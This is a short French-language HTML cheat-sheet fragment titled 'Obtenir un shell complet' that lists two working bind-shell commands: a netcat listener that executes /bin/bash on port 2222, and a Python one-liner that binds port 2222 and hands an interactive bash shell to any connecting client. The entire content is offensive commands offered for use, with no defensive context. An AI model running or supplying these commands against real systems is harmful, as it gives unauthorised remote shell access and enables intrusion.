<h2>Obtenir un shell complet</h2>
<ul>
  <li>nc -lvp 2222 -e /bin/bash en remote et nc -nv 2222 adress port</li>
  <li>python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])" ouvre un shell sur le port 2222</li>
</ul>
